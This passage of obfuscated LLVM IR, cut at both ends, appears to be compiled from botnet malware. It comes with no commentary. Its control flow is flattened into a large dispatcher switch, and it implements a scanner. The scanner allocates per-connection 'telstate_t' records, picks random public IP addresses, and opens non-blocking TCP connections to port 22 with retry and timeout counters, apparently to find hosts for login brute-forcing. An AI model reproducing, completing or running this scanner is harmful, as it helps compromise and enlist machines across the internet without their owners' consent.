  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1827911123, i32* %switchVar
  %.reg2mem354 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar19 = load i32, i32* %switchVar
  switch i32 %switchVar19, label %switchDefault [
    i32 -1827911123, label %first
    i32 -1815655758, label %20
    i32 -1286542662, label %21
    i32 875661644, label %23
    i32 -769414309, label %37
    i32 -940107444, label %42
    i32 2006426062, label %57
    i32 -1969050895, label %60
    i32 -1809714339, label %63
    i32 243656808, label %64
    i32 -710721843, label %65
    i32 1202017390, label %70
    i32 -944515067, label %NodeBlock17
    i32 -193533638, label %NodeBlock15
    i32 682569221, label %NodeBlock13
    i32 -128220192, label %NodeBlock11
    i32 -1975312286, label %LeafBlock9
    i32 2010351312, label %NodeBlock7
    i32 1295360750, label %NodeBlock5
    i32 -1011820558, label %NodeBlock3
    i32 1702779059, label %NodeBlock1
    i32 -1737205943, label %NodeBlock
    i32 637725696, label %LeafBlock
    i32 -1835009126, label %88
    i32 -508760185, label %101
    i32 -1096440972, label %121
    i32 1481189512, label %136
    i32 1998643770, label %147
    i32 -429544262, label %156
    i32 -1541214409, label %161
    i32 -103617248, label %162
    i32 2082242049, label %187
    i32 -518591793, label %188
    i32 1665367969, label %211
    i32 2139716878, label %216
    i32 2025034535, label %227
    i32 -800506225, label %236
    i32 1961120796, label %237
    i32 -1965911930, label %245
    i32 1111480993, label %251
    i32 1602195335, label %252
    i32 -1951705053, label %261
    i32 -1636041805, label %262
    i32 -784926376, label %294
    i32 -2015297145, label %305
    i32 1999124819, label %320
    i32 -897924417, label %351
    i32 972689383, label %352
    i32 -1825633731, label %356
    i32 1478650339, label %371
    i32 -300128556, label %372
    i32 107163902, label %382
    i32 431012218, label %397
    i32 1390159444, label %398
    i32 -747617724, label %406
    i32 327832469, label %412
    i32 -2035785180, label %432
    i32 509166835, label %449
    i32 -32521631, label %454
    i32 353295657, label %459
    i32 -121335514, label %465
    i32 1036458369, label %485
    i32 1801469776, label %502
    i32 -729884832, label %507
    i32 433858599, label %512
    i32 1859626957, label %522
    i32 633253818, label %534
    i32 -855891179, label %535
    i32 -1592514784, label %545
    i32 1841190443, label %560
    i32 1462848643, label %561
    i32 842071653, label %587
    i32 -73210649, label %602
    i32 -841483346, label %611
    i32 1061091644, label %626
    i32 -723884651, label %631
    i32 -585844999, label %639
    i32 -1282484026, label %645
    i32 -1441884655, label %665
    i32 1551600827, label %682
    i32 -1110635405, label %687
    i32 630008239, label %692
    i32 928859799, label %698
    i32 1206228157, label %718
    i32 -1130288854, label %735
    i32 -370023278, label %740
    i32 -952107908, label %745
    i32 1405948800, label %751
    i32 -243409135, label %760
    i32 -1914074891, label %775
    i32 -263279314, label %784
    i32 916763785, label %799
    i32 660326320, label %808
    i32 -1684910553, label %823
    i32 753170833, label %832
    i32 419227474, label %847
    i32 1464272896, label %856
    i32 -1370898069, label %871
    i32 304774092, label %880
    i32 37129940, label %895
    i32 825234541, label %904
    i32 -1563395537, label %919
    i32 360956939, label %928
    i32 1291203358, label %943
    i32 -1166347792, label %944
    i32 -1935903023, label %945
    i32 902266113, label %946
    i32 1529505355, label %947
    i32 -62511576, label %948
    i32 1658052923, label %949
    i32 1065325925, label %950
    i32 -946145282, label %962
    i32 171053274, label %963
    i32 1812402116, label %973
    i32 -940618243, label %988
    i32 1343747862, label %989
    i32 1300786938, label %1015
    i32 -767678761, label %1030
    i32 -411830057, label %1039
    i32 -730492964, label %1054
    i32 -324911268, label %1059
    i32 -1759310021, label %1067
    i32 140600456, label %1073
    i32 -1187015228, label %1093
    i32 777064250, label %1110
    i32 -742387037, label %1130
    i32 200983761, label %1139
    i32 2076059742, label %1159
    i32 -1392695938, label %1164
    i32 1575859010, label %1170
    i32 -987240097, label %1190
    i32 2066997330, label %1207
    i32 926597614, label %1227
    i32 249255506, label %1236
    i32 -693385363, label %1256
    i32 -1515937322, label %1261
    i32 -917562790, label %1267
    i32 1450065196, label %1287
    i32 -857448596, label %1304
    i32 -734638317, label %1324
    i32 1529375302, label %1333
    i32 426926666, label %1353
    i32 158166852, label %1358
    i32 -1598750759, label %1364
    i32 606455283, label %1384
    i32 1730533267, label %1401
    i32 1697972445, label %1421
    i32 -560378493, label %1430
    i32 -783095586, label %1450
    i32 -513957958, label %1455
    i32 901050119, label %1461
    i32 460755482, label %1481
    i32 242708611, label %1498
    i32 137154506, label %1518
    i32 -737042517, label %1527
    i32 596128024, label %1547
    i32 -241251140, label %1552
    i32 -1151250819, label %1558
    i32 830497771, label %1578
    i32 2058773733, label %1595
    i32 1342302764, label %1615
    i32 -637914168, label %1624
    i32 1488096617, label %1644
    i32 -927949567, label %1649
    i32 424222326, label %1655
    i32 -1106466684, label %1675
    i32 -1454046785, label %1692
    i32 -971196453, label %1712
    i32 -771830378, label %1721
    i32 1930776258, label %1741
    i32 1620436454, label %1746
    i32 -1153680536, label %1752
    i32 -900768108, label %1772
    i32 -1373943909, label %1789
    i32 910456079, label %1809
    i32 280544282, label %1818
    i32 -1276827453, label %1838
    i32 1707978123, label %1843
    i32 1106601174, label %1849
    i32 -1954627299, label %1861
    i32 -2025111154, label %1862
    i32 186157626, label %1863
    i32 -1019978166, label %1864
    i32 1492086420, label %1865
    i32 1665805160, label %1866
    i32 239129707, label %1867
    i32 -539856190, label %1868
    i32 2018715702, label %1878
    i32 -1301685264, label %1893
    i32 -2047120601, label %1894
    i32 -521407509, label %1903
    i32 -1888341431, label %1918
    i32 -807618178, label %1923
    i32 1029105100, label %1932
    i32 -1693861306, label %1947
    i32 1246961145, label %1952
    i32 1603240557, label %1960
    i32 -285177349, label %1966
    i32 1597702776, label %1975
    i32 1257746395, label %1995
    i32 946048914, label %2005
    i32 -39255035, label %2020
    i32 1321262702, label %NewDefault
    i32 -2108438042, label %2021
    i32 -1810828069, label %2022
    i32 -202971557, label %2025
    i32 86907678, label %2026
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp sgt i32 %.reload, 512
  %19 = select i1 %18, i32 -1815655758, i32 -1286542662
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 875661644, i32* %switchVar
  store i32 512, i32* %.reg2mem354
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i32, i32* %1, align 4
  store i32 875661644, i32* %switchVar
  store i32 %22, i32* %.reg2mem354
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %.reload355 = load i32, i32* %.reg2mem354
  store i32 %.reload355, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 22) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  store %struct.telstate_t* %32, %struct.telstate_t** %.reg2mem20
  %.reload341 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %33 = bitcast %struct.telstate_t* %.reload341 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  store i32 -769414309, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  %41 = select i1 %40, i32 -940107444, i32 -1969050895
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %.reload340 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload340, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 1024) #2
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %.reload339 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload339, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %.reload338 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload338, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 1024, i32 1, i1 false)
  store i32 2006426062, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  store i32 -769414309, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 8, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %62, align 8
  store i32 -1809714339, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 243656808, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -710721843, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  %69 = select i1 %68, i32 1202017390, i32 -202971557
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %.reload337 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload337, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  store i32 %76, i32* %.reg2mem342
  store i32 -944515067, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload353 = load volatile i32, i32* %.reg2mem342
  %Pivot18 = icmp slt i32 %.reload353, 5
  %77 = select i1 %Pivot18, i32 1295360750, i32 -193533638
  store i32 %77, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload347 = load volatile i32, i32* %.reg2mem342
  %Pivot16 = icmp slt i32 %.reload347, 7
  %78 = select i1 %Pivot16, i32 2010351312, i32 682569221
  store i32 %78, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload345 = load volatile i32, i32* %.reg2mem342
  %Pivot14 = icmp slt i32 %.reload345, 8
  %79 = select i1 %Pivot14, i32 -2047120601, i32 -128220192
  store i32 %79, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload344 = load volatile i32, i32* %.reg2mem342
  %Pivot12 = icmp slt i32 %.reload344, 9
  %80 = select i1 %Pivot12, i32 -807618178, i32 -1975312286
  store i32 %80, i32* %switchVar
  br label %loopEnd

LeafBlock9:                                       ; preds = %loopEntry
  %.reload343 = load volatile i32, i32* %.reg2mem342
  %SwitchLeaf10 = icmp eq i32 %.reload343, 9
  %81 = select i1 %SwitchLeaf10, i32 1246961145, i32 1321262702
  store i32 %81, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload346 = load volatile i32, i32* %.reg2mem342
  %Pivot8 = icmp slt i32 %.reload346, 6
  %82 = select i1 %Pivot8, i32 1343747862, i32 -324911268
  store i32 %82, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload352 = load volatile i32, i32* %.reg2mem342
  %Pivot6 = icmp slt i32 %.reload352, 2
  %83 = select i1 %Pivot6, i32 -1737205943, i32 -1011820558
  store i32 %83, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload349 = load volatile i32, i32* %.reg2mem342
  %Pivot4 = icmp slt i32 %.reload349, 3
  %84 = select i1 %Pivot4, i32 1390159444, i32 1702779059
  store i32 %84, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload348 = load volatile i32, i32* %.reg2mem342
  %Pivot2 = icmp slt i32 %.reload348, 4
  %85 = select i1 %Pivot2, i32 1462848643, i32 -723884651
  store i32 %85, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload351 = load volatile i32, i32* %.reg2mem342
  %Pivot = icmp slt i32 %.reload351, 1
  %86 = select i1 %Pivot, i32 637725696, i32 1961120796
  store i32 %86, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload350 = load volatile i32, i32* %.reg2mem342
  %SwitchLeaf = icmp eq i32 %.reload350, 0
  %87 = select i1 %SwitchLeaf, i32 -1835009126, i32 1321262702
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %2, align 4
  %90 = sext i32 %89 to i64
  %.reload336 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload336, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %91, i32 0, i32 8
  %93 = load i8*, i8** %92, align 8
  call void @llvm.memset.p0i8.i64(i8* %93, i8 0, i64 1024, i32 1, i1 false)
  %94 = load i32, i32* %2, align 4
  %95 = sext i32 %94 to i64
  %.reload335 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload335, i64 %95
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %96, i32 0, i32 3
  %98 = load i8, i8* %97, align 1
  %99 = icmp ne i8 %98, 0
  %100 = select i1 %99, i32 -508760185, i32 -1096440972
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32, i32* %2, align 4
  %103 = sext i32 %102 to i64
  %.reload334 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload334, i64 %103
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %104, i32 0, i32 8
  %106 = load i8*, i8** %105, align 8
  store i8* %106, i8** %11, align 8
  %107 = load i32, i32* %2, align 4
  %108 = sext i32 %107 to i64
  %.reload333 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload333, i64 %108
  %110 = bitcast %struct.telstate_t* %109 to i8*
  call void @llvm.memset.p0i8.i64(i8* %110, i8 0, i64 32, i32 16, i1 false)
  %111 = load i8*, i8** %11, align 8
  %112 = load i32, i32* %2, align 4
  %113 = sext i32 %112 to i64
  %.reload332 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload332, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 8
  store i8* %111, i8** %115, align 8
  %116 = call i32 @getRandomPublicIP()
  %117 = load i32, i32* %2, align 4
  %118 = sext i32 %117 to i64
  %.reload331 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload331, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 1
  store i32 %116, i32* %120, align 4
  store i32 -103617248, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %2, align 4
  %123 = sext i32 %122 to i64
  %.reload330 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload330, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 5
  %126 = load i8, i8* %125, align 1
  %127 = add i8 %126, 1
  store i8 %127, i8* %125, align 1
  %128 = load i32, i32* %2, align 4
  %129 = sext i32 %128 to i64
  %.reload329 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload329, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 5
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i64
  %134 = icmp eq i64 %133, 18
  %135 = select i1 %134, i32 1481189512, i32 1998643770
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %2, align 4
  %138 = sext i32 %137 to i64
  %.reload328 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload328, i64 %138
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %139, i32 0, i32 5
  store i8 0, i8* %140, align 1
  %141 = load i32, i32* %2, align 4
  %142 = sext i32 %141 to i64
  %.reload327 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload327, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 4
  %145 = load i8, i8* %144, align 2
  %146 = add i8 %145, 1
  store i8 %146, i8* %144, align 2
  store i32 1998643770, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* %2, align 4
  %149 = sext i32 %148 to i64
  %.reload326 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload326, i64 %149
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %150, i32 0, i32 4
  %152 = load i8, i8* %151, align 2
  %153 = zext i8 %152 to i64
  %154 = icmp eq i64 %153, 10
  %155 = select i1 %154, i32 -429544262, i32 -1541214409
  store i32 %155, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %2, align 4
  %158 = sext i32 %157 to i64
  %.reload325 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload325, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 3
  store i8 1, i8* %160, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 -103617248, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %163, align 4
  %164 = call zeroext i16 @htons(i16 zeroext 22) #13
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %164, i16* %165, align 2
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %167 = getelementptr inbounds [8 x i8], [8 x i8]* %166, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %167, i8 0, i64 8, i32 4, i1 false)
  %168 = load i32, i32* %2, align 4
  %169 = sext i32 %168 to i64
  %.reload324 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload324, i64 %169
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  %175 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %176 = load i32, i32* %2, align 4
  %177 = sext i32 %176 to i64
  %.reload323 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload323, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 0
  store i32 %175, i32* %179, align 16
  %180 = load i32, i32* %2, align 4
  %181 = sext i32 %180 to i64
  %.reload322 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload322, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 16
  %185 = icmp eq i32 %184, -1
  %186 = select i1 %185, i32 2082242049, i32 -518591793
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* %2, align 4
  %190 = sext i32 %189 to i64
  %.reload321 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload321, i64 %190
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 16
  %194 = load i32, i32* %2, align 4
  %195 = sext i32 %194 to i64
  %.reload320 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload320, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 0
  %198 = load i32, i32* %197, align 16
  %199 = call i32 (i32, i32, ...) @fcntl(i32 %198, i32 3, i8* null)
  %200 = or i32 %199, 2048
  %201 = call i32 (i32, i32, ...) @fcntl(i32 %193, i32 4, i32 %200)
  %202 = load i32, i32* %2, align 4
  %203 = sext i32 %202 to i64
  %.reload319 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload319, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 16
  %207 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %208 = call i32 @connect(i32 %206, %struct.sockaddr* %207, i32 16)
  %209 = icmp eq i32 %208, -1
  %210 = select i1 %209, i32 1665367969, i32 2025034535
  store i32 %210, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = call i32* @__errno_location() #13
  %213 = load i32, i32* %212, align 4
  %214 = icmp ne i32 %213, 115
  %215 = select i1 %214, i32 2139716878, i32 2025034535
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i32, i32* %2, align 4
  %218 = sext i32 %217 to i64
  %.reload318 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload318, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 16
  %222 = call i32 @sclose(i32 %221)
  %223 = load i32, i32* %2, align 4
  %224 = sext i32 %223 to i64
  %.reload317 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload317, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 3
  store i8 1, i8* %226, align 1
  store i32 -800506225, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %.reload316 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload316, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 2
  store i8 1, i8* %231, align 8
  %232 = load i32, i32* %2, align 4
  %233 = sext i32 %232 to i64
  %.reload315 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload315, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 6
  store i32 0, i32* %235, align 4
  store i32 -800506225, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i32, i32* %2, align 4
  %239 = sext i32 %238 to i64
  %.reload314 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload314, i64 %239
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %240, i32 0, i32 6
  %242 = load i32, i32* %241, align 4
  %243 = icmp eq i32 %242, 0
  %244 = select i1 %243, i32 -1965911930, i32 1111480993
  store i32 %244, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %247 = load i32, i32* %2, align 4
  %248 = sext i32 %247 to i64
  %.reload313 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload313, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 6
  store i32 %246, i32* %250, align 4
  store i32 1111480993, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  store i32 1602195335, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %254 = getelementptr inbounds [16 x i64], [16 x i64]* %253, i64 0, i64 0
  %255 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %254) #2, !srcloc !6
  %256 = extractvalue { i64, i64* } %255, 0
  %257 = extractvalue { i64, i64* } %255, 1
  %258 = trunc i64 %256 to i32
  store i32 %258, i32* %12, align 4
  %259 = ptrtoint i64* %257 to i64
  %260 = trunc i64 %259 to i32
  store i32 %260, i32* %13, align 4
  store i32 -1951705053, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 -1636041805, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load i32, i32* %2, align 4
  %264 = sext i32 %263 to i64
  %.reload312 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload312, i64 %264
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %265, i32 0, i32 0
  %267 = load i32, i32* %266, align 16
  %268 = srem i32 %267, 64
  %269 = zext i32 %268 to i64
  %270 = shl i64 1, %269
  %271 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %272 = load i32, i32* %2, align 4
  %273 = sext i32 %272 to i64
  %.reload311 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload311, i64 %273
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %274, i32 0, i32 0
  %276 = load i32, i32* %275, align 16
